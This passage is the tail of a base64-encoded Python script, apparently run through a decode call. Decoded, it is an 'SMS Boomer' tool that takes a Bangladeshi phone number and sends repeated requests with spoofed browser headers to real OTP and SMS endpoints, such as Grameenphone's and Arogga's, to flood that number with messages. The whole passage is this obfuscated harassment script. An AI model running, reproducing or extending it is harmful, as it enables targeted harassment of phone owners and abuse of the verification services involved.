CAic2VjLWNoLXVhLW1vYmlsZSI6ICI/MSIsCiAgICAgICAgInNlYy1jaC11YS1wbGF0Zm9ybSI6ICciQW5kcm9pZCInLAogICAgICAgICJzZWMtZmV0Y2gtZGVzdCI6ICJlbXB0eSIsCiAgICAgICAgInNlYy1mZXRjaC1tb2RlIjogImNvcnMiLAogICAgICAgICJzZWMtZmV0Y2gtc2l0ZSI6ICJzYW1lLXNpdGUiLAogICAgICAgICJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChMaW51eDsgQW5kcm9pZCAxMDsgSykgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEzNy4wLjAuMCBNb2JpbGUgU2FmYXJpLzUzNy4zNiIKICAgIH0KCiAgICBwYXlsb2FkID0gewogICAgICAgICJjcmVhdGVVc2VyQ2hlY2siOiBUcnVlLAogICAgICAgICJwaG9uZU51bWJlciI6IGYiKzg4e3Bob25lX251bWJlci5sc3RyaXAoJysnKX0iLAogICAgICAgICJhcHBsaWNhdGlvbkNoYW5uZWwiOiAiV0VCX0FQUCIKICAgIH0KCiAgICB0cnk6CiAgICAgICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPXBheWxvYWQpIAogICAgICAgIHJldHVybiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDAKICAgIGV4Y2VwdCByZXF1ZXN0cy5leGNlcHRpb25zLlJlcXVlc3RFeGNlcHRpb24gYXMgZToKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBjYWxsX2dwZmlfYXBpKHBob25lX251bWJlcj1Ob25lKToKICAgIGlmIHBob25lX251bWJlciBpcyBOb25lOgogICAgICAgIHBob25lX251bWJlciA9IGlucHV0KCJFbnRlciBwaG9uZSBudW1iZXIgZm9yIEdQRkkgQVBJOiAiKS5zdHJpcCgpCgogICAgdXJsID0gImh0dHBzOi8vd2VibG9naW5kYS5ncmFtZWVucGhvbmUuY29tL2JhY2tlbmQvYXBpL3YxL290cCIKCiAgICBoZWFkZXJzID0gewogICAgICAgICJBY2NlcHQiOiAiYXBwbGljYXRpb24vanNvbiwgdGV4dC9wbGFpbiwgKi8qIiwKICAgICAgICAiQWNjZXB0LUxhbmd1YWdlIjogImVuLVVTLGVuO3E9MC45IiwKICAgICAgICAiQ29ubmVjdGlvbiI6ICJrZWVwLWFsaXZlIiwKICAgICAgICAiQ29udGVudC1UeXBlIjogImFwcGxpY2F0aW9uL3gtd3d3LWZvcm0tdXJsZW5jb2RlZCIsCiAgICAgICAgIk9yaWdpbiI6ICJodHRwczovL3d3dy5ncmFtZWVucGhvbmUuY29tIiwKICAgICAgICAiUmVmZXJlciI6ICJodHRwczovL3d3dy5ncmFtZWVucGhvbmUuY29tLyIsCiAgICAgICAgIlNlYy1GZXRjaC1EZXN0IjogImVtcHR5IiwKICAgICAgICAiU2VjLUZldGNoLU1vZGUiOiAiY29ycyIsCiAgICAgICAgIlNlYy1GZXRjaC1TaXRlIjogInNhbWUtc2l0ZSIsCiAgICAgICAgIlVzZXItQWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IiwKICAgICAgICAic2VjLWNoLXVhIjogJyJDaHJvbWl1bSI7dj0iMTM3IiwgIk5vdC9BKUJyYW5kIjt2PSIyNCInLAogICAgICAgICJzZWMtY2gtdWEtbW9iaWxlIjogIj8xIiwKICAgICAgICAic2VjLWNoLXVhLXBsYXRmb3JtIjogJyJBbmRyb2lkIicsCiAgICB9CgogICAgcGF5bG9hZCA9IHsKICAgICAgICAibXNpc2RuIjogcGhvbmVfbnVtYmVyCiAgICB9CgogICAgdHJ5OgogICAgICAgIHJlc3BvbnNlID0gcmVxdWVzdHMucG9zdCh1cmwsIGhlYWRlcnM9aGVhZGVycywgZGF0YT1wYXlsb2FkKQogICAgICAgIHJldHVybiByZXNwb25zZS5zdGF0dXNfY29kZSA9PSAyMDAKICAgIGV4Y2VwdDoKICAgICAgICByZXR1cm4gRmFsc2UKCmRlZiBjYWxsX2Fyb2dnYV9hcGkocGhvbmVfbnVtYmVyKToKICAgIHVybCA9ICJodHRwczovL2FwaS5hcm9nZ2EuY29tL2F1dGgvdjEvc21zL3NlbmQ/Zj1td2ViJmI9JnY9Jm9zPSZvc3Y9JnJlZlBhcnRuZXI9IgoKICAgIGhlYWRlcnMgPSB7CiAgICAgICAgImFjY2VwdCI6ICIqLyoiLAogICAgICAgICJjb250ZW50LXR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkO2NoYXJzZXQ9VVRGLTgiLAogICAgICAgICJvcmlnaW4iOiAiaHR0cHM6Ly9tLmFyb2dnYS5jb20iLAogICAgICAgICJyZWZlcmVyIjogImh0dHBzOi8vbS5hcm9nZ2EuY29tLyIsCiAgICAgICAgInVzZXItYWdlbnQiOiAiTW96aWxsYS81LjAgKExpbnV4OyBBbmRyb2lkIDEwOyBLKSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvMTM3LjAuMC4wIE1vYmlsZSBTYWZhcmkvNTM3LjM2IgogICAgfQoKICAgIGRhdGEgPSB7CiAgICAgICAgIm1vYmlsZSI6IGYiKzg4e3Bob25lX251bWJlcn0iLAogICAgICAgICJmY21Ub2tlbiI6ICIiLAogICAgICAgICJyZWZlcnJhbCI6ICIiCiAgICB9CgogICAgdHJ5OgogICAgICAgIHJlcyA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGRhdGE9ZGF0YSwgdGltZW91dD0xMCkKICAgICAgICByZXR1cm4gcmVzLnN0YXR1c19jb2RlID09IDIwMAogICAgZXhjZXB0IHJlcXVlc3RzLmV4Y2VwdGlvbnMuUmVxdWVzdEV4Y2VwdGlvbjoKICAgICAgICByZXR1cm4gRmFsc2UKIyA9PT09PT09PT09PT09PT09PT09PT0gQVBJIEhBTkRMRVIgPT09PT09PT09PT09PT09PT09PT09CmRlZiBoYW5kbGVfYXBpcyhtb2JpbGVfbnVtYmVyKToKICAgIGN1cnJlbnRfbW9kdWxlID0gc3lzLm1vZHVsZXNbX19uYW1lX19dCiAgICBhcGlfZnVuY3Rpb25zID0gWwogICAgICAgIChuYW1lLCBmdW5jKSBmb3IgbmFtZSwgZnVuYyBpbiBpbnNwZWN0LmdldG1lbWJlcnMoY3VycmVudF9tb2R1bGUsIGluc3BlY3QuaXNmdW5jdGlvbikKICAgICAgICBpZiBuYW1lLnN0YXJ0c3dpdGgoImNhbGxfIikgYW5kIG5hbWUuZW5kc3dpdGgoIl9hcGkiKQogICAgXQoKICAgIHN1Y2Nlc3NfYXBpcyA9IFtdCiAgICBmYWlsZWRfYXBpcyA9IFtdCgogICAgZm9yIG5hbWUsIGFwaV9mdW5jIGluIGFwaV9mdW5jdGlvbnM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBhcGlfZnVuYyhtb2JpbGVfbnVtYmVyKToKICAgICAgICAgICAgICAgIHN1Y2Nlc3NfYXBpcy5hcHBlbmQobmFtZSkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIGZhaWxlZF9hcGlzLmFwcGVuZChuYW1lKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246CiAgICAgICAgICAgIGZhaWxlZF9hcGlzLmFwcGVuZChuYW1lKQoKICAgIHJldHVybiBzdWNjZXNzX2FwaXMsIGZhaWxlZF9hcGlzCgojID09PT09PT09PT09PT09PT09PT09PSBNQUlOID09PT09PT09PT09PT09PT09PT09PQpkZWYgbWFpbigpOgogICAgYW5pbWF0ZV9iYW5uZXIoKSAgIyBFbnN1cmUgYmFubmVyIGlzIHNob3duIGZpcnN0CiAgICBwcmludChGb3JlLkNZQU4gKyBTdHlsZS5CUklHSFQgKyAiXG5XZWxjb21lIHRvIHRoZSBTTVMg8J+SpUJvb21lcvCfkqUgVG9vbCFcbiIpCiAgICBtb2JpbGVfbnVtYmVyID0gaW5wdXQoRm9yZS5SRUQgKyBTdHlsZS5CUklHSFQgKyAiRW50ZXIgdGhlIG1vYmlsZSBudW1iZXIgKEV4LiAwMTczNDU2Nzg5MCk6ICIpLnN0cmlwKCkKCiAgICBpZiBub3QgKG1vYmlsZV9udW1iZXIuc3RhcnRzd2l0aCgiMDEiKSBhbmQgbGVuKG1vYmlsZV9udW1iZXIpID09IDExKToKICAgICAgICBwcmludChGb3JlLlJFRCArICJJbnZhbGlkIG51bWJlci4gTXVzdCBzdGFydCB3aXRoIDAxIGFuZCBiZSAxMSBkaWdpdHMuIikKICAgICAgICByZXR1cm4KCiAgICBwcmludChGb3JlLk1BR0VOVEEgKyAiXG5TZW5kaW5nIFNNUy4uLlxuIi5jZW50ZXIoc2h1dGlsLmdldF90ZXJtaW5hbF9zaXplKCkuY29sdW1ucykpCiAgICBzdWNjZXNzLCBmYWlsZWQgPSBoYW5kbGVfYXBpcyhtb2JpbGVfbnVtYmVyKQoKICAgIHByaW50KEZvcmUuQ1lBTiArICJcblN1bW1hcnk6XG4iLmNlbnRlcihzaHV0aWwuZ2V0X3Rlcm1pbmFsX3NpemUoKS5jb2x1bW5zKSkKICAgIHByaW50KEZvcmUuR1JFRU4gKyBmIuKclCBUb3RhbCBTdWNjZXNzZnVsOiB7bGVuKHN1Y2Nlc3MpfSIuY2VudGVyKHNodXRpbC5nZXRfdGVybWluYWxfc2l6ZSgpLmNvbHVtbnMpKQogICAgaWYgc3VjY2VzczoKICAgICAgICBmb3IgYXBpIGluIHN1Y2Nlc3M6CiAgICAgICAgICAgIHByaW50KEZvcmUuR1JFRU4gKyBmIiAg4oaSIHthcGl9IikKCiAgICBwcmludChGb3JlLlJFRCArIGYiXG7inJggVG90YWwgRmFpbGVkOiB7bGVuKGZhaWxlZCl9Ii5jZW50ZXIoc2h1dGlsLmdldF90ZXJtaW5hbF9zaXplKCkuY29sdW1ucykpCiAgICBpZiBmYWlsZWQ6CiAgICAgICAgZm9yIGFwaSBpbiBmYWlsZWQ6CiAgICAgICAgICAgIHByaW50KEZvcmUuUkVEICsgZiIgIOKGkiB7YXBpfSIpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgbWFpbigp'))
